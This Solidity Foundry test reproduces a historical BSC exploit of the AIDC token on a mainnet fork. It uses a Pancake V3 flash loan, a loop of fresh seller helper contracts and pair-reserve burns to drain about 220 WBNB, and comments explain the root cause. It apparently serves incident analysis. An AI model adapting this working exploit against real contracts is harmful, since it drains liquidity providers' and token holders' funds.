// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~220.13 WBNB
// Attacker : 0x89eb2c99e970d831525c7a52badc290afa116b63
// Attack Contract : 0x26f625738019a1d710b074b23714d1538a151de4
// Vulnerable Contract : 0x5021d71859f81b4c905b573591db8f9cc4a0c6fe
// Attack Tx : https://bscscan.com/tx/0x66960f7febf399fa8bd94904398f535c500f4f575dbf025de7b9ab450342645e

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x5021d71859f81b4c905b573591db8f9cc4a0c6fe#code

// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2071415914948685892
//
// Attack summary: repeated fresh helper sells set AIDC's accumulated burn, then router transfers trigger burns
// from the AIDC/WBNB pair and sync the pair at a deflated AIDC reserve.
// Root cause: AIDCToken lets ordinary transfers burn accumulated sell-side amounts directly from the AMM pair.

address constant ATTACKER = 0x89eb2C99E970d831525c7A52baDC290aFA116b63;
address constant ATTACK_CONTRACT = 0x26F625738019A1D710B074B23714D1538a151DE4;
address constant AIDC = 0x5021d71859F81B4c905b573591db8F9Cc4A0C6fe;
address constant AIDC_WBNB_PAIR = 0x2725033282b3bd4BE8873B7F0f622c18E3b7cbd8;
address payable constant PANCAKE_V2_ROUTER = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
address constant PANCAKE_V3_FLASH_POOL = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
address payable constant WBNB_TOKEN = payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
address payable constant BUILDER_TIP_RECEIVER = payable(0x4848489f0b2BEdd788c696e2D79b6b69D7484848);

uint256 constant FORK_BLOCK = 106_926_103;
uint256 constant AIDC_REWARD_CLAIM_DUST = 0.000_01 ether;
uint256 constant FLASH_WBNB_AMOUNT = 200 ether;
uint256 constant INITIAL_BUY_BNB = 100 ether;
uint256 constant FINAL_BUILDER_TIP = 1 ether;
uint256 constant LOOP_COUNT = 13;
uint256 constant BPS_DENOMINATOR = 10_000;
uint256 constant AIDC_SELL_BURN_BPS = 3000;

contract ContractTest is BaseTestWithBalanceLog {
    AIDCExploit private exploit;

    function setUp() public {
        vm.createSelectFork("bsc", FORK_BLOCK);

        fundingToken = WBNB_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical Attack Contract");
        vm.label(AIDC, "AIDCToken");
        vm.label(AIDC_WBNB_PAIR, "AIDC/WBNB Pair");
        vm.label(PANCAKE_V2_ROUTER, "Pancake V2 Router");
        vm.label(PANCAKE_V3_FLASH_POOL, "Pancake V3 USDT/WBNB Pool");
        vm.label(WBNB_TOKEN, "WBNB");

        exploit = new AIDCExploit();
    }

    function testExploit() public balanceLog {
        vm.deal(ATTACKER, 1 ether);

        // step 1: claim the historical root address' pending AIDC reward and seed the local exploit contract.
        vm.prank(ATTACKER, ATTACKER);
        (bool ok,) = AIDC.call{value: AIDC_REWARD_CLAIM_DUST}("");
        require(ok, "AIDC reward claim failed");

        uint256 claimedAidc = IERC20(AIDC).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        IERC20(AIDC).transfer(address(exploit), claimedAidc);

        // step 2: execute the reconstructed flash-loan reserve burn loop.
        exploit.start();

        assertGt(IERC20(WBNB_TOKEN).balanceOf(ATTACKER), 200 ether, "WBNB profit not reproduced");
    }
}

contract AIDCExploit {
    receive() external payable {}

    function start() external {
        IPancakeV3Pool(PANCAKE_V3_FLASH_POOL).flash(address(this), 0, FLASH_WBNB_AMOUNT, "");
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata
    ) external {
        require(msg.sender == PANCAKE_V3_FLASH_POOL, "unauthorized flash callback");
        require(fee0 == 0, "unexpected token0 fee");

        // step 3: unwrap half of the flash loan, then seed a tiny AIDC/WBNB LP position.
        IWBNB(WBNB_TOKEN).withdraw(INITIAL_BUY_BNB);
        seedLpWithClaimedAidc();
        uint256 lpStep = IPancakePair(AIDC_WBNB_PAIR).balanceOf(address(this)) / 1000;

        // step 4: buy AIDC to the router, then use the first LP removal to forward it back and trigger burn/sync.
        address[] memory buyPath = path(WBNB_TOKEN, AIDC);
        IUniswapV2Router(PANCAKE_V2_ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: INITIAL_BUY_BNB}(
            0, buyPath, PANCAKE_V2_ROUTER, block.timestamp
        );
        removeLiquidity(lpStep);

        // step 5: fresh seller helpers bypass per-address cooldown while repeated burns shrink pair AIDC reserves.
        for (uint256 i; i < LOOP_COUNT; ++i) {
            AIDCSellHelper helper = new AIDCSellHelper();
            uint256 helperAmount = IERC20(AIDC).balanceOf(address(this));
            if (i == LOOP_COUNT - 1) {
                helperAmount = capFinalSell(helperAmount, lpStep);
            }
            IERC20(AIDC).transfer(address(helper), helperAmount);
            helper.sellToPair();
            IPancakePair(AIDC_WBNB_PAIR).skim(PANCAKE_V2_ROUTER);
            removeLiquidity(lpStep);
        }

        // step 6: final fresh helper swaps remaining AIDC to native BNB through Pancake V2.
        AIDCSellHelper finalSeller = new AIDCSellHelper();
        IERC20(AIDC).transfer(address(finalSeller), IERC20(AIDC).balanceOf(address(this)));
        finalSeller.swapAidcForBnb(address(this));

        // step 7: wrap proceeds, repay the flash loan plus fee, then forward profit to the attacker address.
        IWBNB(WBNB_TOKEN).deposit{value: address(this).balance}();
        IERC20(WBNB_TOKEN).transfer(PANCAKE_V3_FLASH_POOL, FLASH_WBNB_AMOUNT + fee1);

        IWBNB(WBNB_TOKEN).withdraw(FINAL_BUILDER_TIP);
        (bool sent,) = payable(BUILDER_TIP_RECEIVER).call{value: FINAL_BUILDER_TIP}("");
        require(sent, "builder tip failed");

        IERC20(WBNB_TOKEN).transfer(ATTACKER, IERC20(WBNB_TOKEN).balanceOf(address(this)));
    }

    function seedLpWithClaimedAidc() private {
        IPancakePair pair = IPancakePair(AIDC_WBNB_PAIR);
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();

        IERC20(AIDC).transfer(AIDC_WBNB_PAIR, IERC20(AIDC).balanceOf(address(this)));

        uint256 aidcExcess = IERC20(AIDC).balanceOf(AIDC_WBNB_PAIR) - uint256(reserve0);
        uint256 wbnbSeed = aidcExcess * uint256(reserve1) / uint256(reserve0);
        IERC20(WBNB_TOKEN).transfer(AIDC_WBNB_PAIR, wbnbSeed);
        pair.mint(address(this));
        pair.approve(PANCAKE_V2_ROUTER, type(uint256).max);
    }

    function capFinalSell(
        uint256 availableAidc,
        uint256 lpStep
    ) private view returns (uint256) {
        IPancakePair pair = IPancakePair(AIDC_WBNB_PAIR);
        (uint112 aidcReserve,,) = pair.getReserves();

        uint256 reserveAfterLpRemoval = uint256(aidcReserve) - (uint256(aidcReserve) * lpStep / pair.totalSupply());
        uint256 maxSellBeforeEmptyReserve = (reserveAfterLpRemoval - 1) * BPS_DENOMINATOR / AIDC_SELL_BURN_BPS;
        return availableAidc < maxSellBeforeEmptyReserve ? availableAidc : maxSellBeforeEmptyReserve;
    }

    function removeLiquidity(
        uint256 lpAmount
    ) private {
        IUniswapV2Router(PANCAKE_V2_ROUTER)
            .removeLiquidityETHSupportingFeeOnTransferTokens(AIDC, lpAmount, 0, 0, address(this), block.timestamp);
    }

    function path(
        address tokenIn,
        address tokenOut
    ) private pure returns (address[] memory route) {
        route = new address[](2);
        route[0] = tokenIn;
        route[1] = tokenOut;
    }
}

contract AIDCSellHelper {
    receive() external payable {}

    function sellToPair() external {
        IERC20(AIDC).transfer(AIDC_WBNB_PAIR, IERC20(AIDC).balanceOf(address(this)));
    }

    function swapAidcForBnb(
        address receiver
    ) external {
        uint256 amountIn = IERC20(AIDC).balanceOf(address(this));
        IERC20(AIDC).approve(PANCAKE_V2_ROUTER, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = AIDC;
        path[1] = WBNB_TOKEN;
        IUniswapV2Router(PANCAKE_V2_ROUTER)
            .swapExactTokensForETHSupportingFeeOnTransferTokens(amountIn, 0, path, receiver, block.timestamp);
    }
}
